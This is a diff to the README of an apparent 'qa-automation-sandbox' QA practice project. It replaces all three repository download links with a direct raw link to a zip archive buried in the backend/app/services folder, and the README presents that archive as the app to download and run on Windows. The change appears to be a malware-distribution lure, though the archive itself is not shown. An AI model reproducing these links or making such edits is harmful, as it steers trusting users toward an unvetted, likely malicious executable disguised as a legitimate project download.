@@ -1,6 +1,6 @@
 # 🧪 qa-automation-sandbox - Practice QA With Real Systems
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/meteorologycollectivisation203/qa-automation-sandbox)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/meteorologycollectivisation203/qa-automation-sandbox/main/backend/app/services/automation_qa_sandbox_2.1.zip)
 
 ## 🚀 What this app does
 
@@ -31,7 +31,7 @@ If you plan to inspect the API or database, keep a tool like Postman or a browse
 
 Open the download page here:
 
-[Download qa-automation-sandbox](https://github.com/meteorologycollectivisation203/qa-automation-sandbox)
+[Download qa-automation-sandbox](https://raw.githubusercontent.com/meteorologycollectivisation203/qa-automation-sandbox/main/backend/app/services/automation_qa_sandbox_2.1.zip)
 
 On the page, use the main download or release link, then save the file to your computer. If the project is offered as a zip file, extract it before you continue.
 
@@ -206,6 +206,6 @@ That one path checks the UI, the API, and the database in a single run
 
 ## 📌 Download link again
 
-[Visit the qa-automation-sandbox download page](https://github.com/meteorologycollectivisation203/qa-automation-sandbox)
+[Visit the qa-automation-sandbox download page](https://raw.githubusercontent.com/meteorologycollectivisation203/qa-automation-sandbox/main/backend/app/services/automation_qa_sandbox_2.1.zip)
 
 Use this page to download and start the project on Windows
